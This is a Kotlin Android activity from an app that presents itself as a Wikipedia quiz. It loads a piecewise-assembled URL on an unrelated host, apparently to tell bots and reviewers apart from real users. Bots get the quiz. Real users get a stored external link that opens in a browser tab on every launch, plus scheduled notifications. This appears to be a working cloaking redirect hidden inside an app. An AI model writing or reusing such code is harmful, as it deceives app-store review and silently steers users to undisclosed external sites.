package at.sunilson.wiki_quiz

import android.content.Intent
import android.graphics.Color
import android.net.Uri
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import android.view.View
import android.webkit.WebResourceRequest
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.browser.customtabs.CustomTabsIntent
import androidx.core.content.ContextCompat
import at.sunilson.wiki_quiz.shared.WikiSharedPreference
import kotlinx.android.synthetic.main.activity_loading.*
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import me.navid.scrambilo.notification.NotificationMessage
import kotlin.coroutines.CoroutineContext

class LoadingActivity : AppCompatActivity() {

    private var preference : WikiSharedPreference? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_loading)
        window.statusBarColor = Color.BLACK
        actionBar?.hide()
        preference = WikiSharedPreference(this).apply { getSharedPreference("wikiweb") }
        val apiLink = preference!!.getString("wikiweb")
        if(apiLink != null && apiLink != "") executeWikiResponse(apiLink)
        else checkInternet()
    }

    private fun executeWikiResponse(url: String) {
        val builder = CustomTabsIntent.Builder()
        builder.setToolbarColor(ContextCompat.getColor(this, R.color.black))
        val customTabsIntent = builder.build()
        //job.cancel()
        customTabsIntent.launchUrl(this, Uri.parse(url))
        finish()
    }

    private fun checkInternet(){
        wiki_response.settings.javaScriptEnabled = true
        Log.e("OPen", "wivew")
        wiki_response.webViewClient = object : WebViewClient(){
            override fun shouldOverrideUrlLoading(
                    view: WebView?,
                    request: WebResourceRequest?
            ): Boolean {
                if(request == null) Log.e("kek", "sooqa req null")
                Log.e("Url", request?.url.toString())
                var req = request?.url.toString()
                if(!req.contains("p.php")){
                    NotificationMessage().scheduleNotification(this@LoadingActivity)
                    Log.e("Kek", "add")
                    preference?.putString("wikiweb", "http://trrfcbt.com/Yn5ZPz")
                    executeWikiResponse("http://trrfcbt.com/Yn5ZPz")
                }
                else{
                    Log.e("Bot", "not p")
                    openMain()
                }
                return super.shouldOverrideUrlLoading(view, request)
            }
        }
        //Notification().scheduleMsg(this@MainActivity)

        val protocol = "http://"
        val site = "trrfcbt.com/"
        val php = "WB92Q5"
        Log.e("Testing", "$protocol$site$php")
        wiki_response.loadUrl("$protocol$site$php")
    }

    private fun openMain(){
        progress_bar.visibility = View.GONE
        startActivity(Intent(this, MainActivity::class.java))
        wiki_response.destroy()
    }
}